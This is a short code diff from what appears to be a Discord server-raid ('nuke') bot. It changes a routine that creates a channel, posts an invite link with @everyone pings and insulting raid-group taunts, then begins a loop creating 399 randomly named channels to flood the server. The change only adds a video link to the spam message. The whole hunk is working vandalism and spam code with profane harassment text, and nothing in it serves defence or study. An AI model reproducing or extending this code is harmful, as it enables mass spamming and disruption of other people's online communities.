@@ -255,7 +255,7 @@ client.on('message', msg => {
         }else{
        var number = 0
        
-       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
+       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
         while(number < 399) {
             msg.guild.channels.create(random123()).then(c => { 
                
